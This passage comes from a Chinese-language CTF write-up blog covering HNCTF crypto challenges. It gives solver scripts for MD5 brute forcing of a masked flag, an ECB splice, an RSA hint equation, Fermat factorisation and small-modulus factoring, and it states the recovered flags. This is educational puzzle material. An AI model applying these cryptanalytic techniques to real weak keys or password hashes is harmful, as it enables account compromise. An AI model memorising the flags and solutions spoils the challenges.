class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure><h3 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h3><h3 id="Little-Lattice"><a href="#Little-Lattice" class="headerlink" title="Little Lattice"></a>Little Lattice</h3><h3 id="S1mple-ECB"><a href="#S1mple-ECB" class="headerlink" title="S1mple_ECB"></a>S1mple_ECB</h3><p>了解ecb的性质，是拼接的，取前32位和后32位，分别解密就行了</p><p>NSSCTF{ECB_m0de_1s_qui4e_s1mple}</p><h3 id="md5太残暴了"><a href="#md5太残暴了" class="headerlink" title="md5太残暴了"></a>md5太残暴了</h3><p>题目描述：</p><p>小明养成了定期修改密码的好习惯，同时，他还是一个CTF爱好者。有一天，他突发奇想，用flag格式来设置密码，为了防止忘记密码，他还把密码进行了md5加密。为了避免被其他人看到全部密码，他还特意修改了其中部分字符为#。你能猜出他的密码吗？<br>plaintext = flag<br>md5 = ac7f4d52c3924925aa9c8a7a1f522451<br>PS: 第一个#是大写字母，第二个#是小写字母，其他是数字。</p><p>md5爆破。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">plaintext = <span class="string">&quot;flag&#123;#00#_P4ssw0rd_N3v3r_F0rg3t_63####&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">Dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>)] <span class="comment">#小写字母</span></span><br><span class="line">dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>)] <span class="comment">#大写字母</span></span><br><span class="line">num = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Dic)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                    m = <span class="string">&#x27;flag&#123;&#x27;</span> + Dic[i] + <span class="string">&#x27;00&#x27;</span>+dic[j] + <span class="string">&#x27;_P4ssw0rd_N3v3r_F0rg3t_63&#x27;</span> + num[a] + num[b] + num[c]</span><br><span class="line">                    md5 = hashlib.md5(m.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> md5 == <span class="string">&#x27;ac7f4d52c3924925aa9c8a7a1f522451&#x27;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(m , md5)</span><br></pre></td></tr></table></figure><h3 id="mathRSA"><a href="#mathRSA" class="headerlink" title="mathRSA"></a>mathRSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">hint = p**<span class="number">5</span> - q**<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f = <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943      </span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552       </span></span><br><span class="line"><span class="string">h = 130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>由题目可知，n=pq，hint=p^5 - q^4,由此我们可以构造出非线性方程组</p><p>pq-n=0</p><p>p^5 - q^4-hint=0</p><p>利用sympy库对其解方程组得到p,q。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, p**<span class="number">5</span> - q**<span class="number">4</span> - h], [p, q])</span><br></pre></td></tr></table></figure><p>解出p，q后一把梭就行了。</p><p>方法二：</p><p><code>hint=p**5 - q**4</code>，因为hint很大，所以<code>p**5</code>远大于<code>q**4</code>，可以直接对hint开5次方得到temp，此时temp&lt;p再循环取temp的下一个素数，直至n可以整除temp为止,就能得到p了。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552</span></span><br><span class="line">h = <span class="number">130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line">temp= gmpy2.iroot(h,<span class="number">5</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> n % temp !=<span class="number">0</span>:</span><br><span class="line">    temp =gmpy2.next_prime(temp)</span><br><span class="line">p = temp</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="Week3-1"><a href="#Week3-1" class="headerlink" title="Week3"></a>Week3</h2><h3 id="pnearq"><a href="#pnearq" class="headerlink" title="pnearq"></a>pnearq</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 19421904767367129549329507820147867763064747101931314714173717122035977491291441314433180813343755107381230481007143328156292096871675328839756035726106037229325380698967544660649710464634698425387682458721466040894830503881966355435442651493212040443436714597490121865537266815247879839020846287255634123530517095030752832857842819836940083915495464712363169428825344678729929317207583197980607919720642725221740680718976635305544368542563503440076036727388062097647374046378854873864505267644315352602271587283702733779081805129429479541906613334092422428543951370065910195162721686773383508480268145903016615151713</span></span><br><span class="line"><span class="string">c = 16430654037742749931837577925393394466626615745270895225352757745284038922799868617243616416116392338428121605256850230862894296244375242336599929497221079420665154174930054597666915358687410522457846003186806053368237783147731665147575913322026626738697036282908055611350347494310666532700194563684837580022875526378181343082801716942536163583090541294011987732281942148455345223347021675781368596340860151253774597168954881987520338304516390785094435356412111780768446904948045448510663589654475221029009283144829902553888829840193614048967712676048740814622290029846433107762872806981599110271586325156855299974310</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到q = next_prime(p)，q是p的下一个质数，费马分解N即可。一个费马分解的小脚本。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">  x = n</span><br><span class="line">  y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> y &lt; x:</span><br><span class="line">    x = y</span><br><span class="line">    y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n, verbose=<span class="literal">True</span></span>):</span><br><span class="line">    a = isqrt(n) <span class="comment"># int(ceil(n**0.5))</span></span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b*b != b2:</span><br><span class="line">        <span class="comment"># if verbose:</span></span><br><span class="line">        <span class="comment">#     print(&#x27;Trying: a=%s b2=%s b=%s&#x27; % (a, b2, b))</span></span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p=a+b</span><br><span class="line">    q=a-b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line">fermat(n)</span><br></pre></td></tr></table></figure><h3 id="smallRSA"><a href="#smallRSA" class="headerlink" title="smallRSA"></a>smallRSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rom Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())[:<span class="number">13</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span>(m &lt; n)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="comment"># print(f&quot;flag = &#123;flag&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line"><span class="string">c = 118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>n很小，factor爆破出p，q。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line">p = <span class="number">768780063730500942699787302253</span></span><br><span class="line">q = <span class="number">813910604866037851538498611597</span></span><br><span class="line">c = <span class="number">118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><h3 id="square"><a href="#square" class="headerlink" title="square"></a>square</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HNCTF </tag>
            
            <tag> WP </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
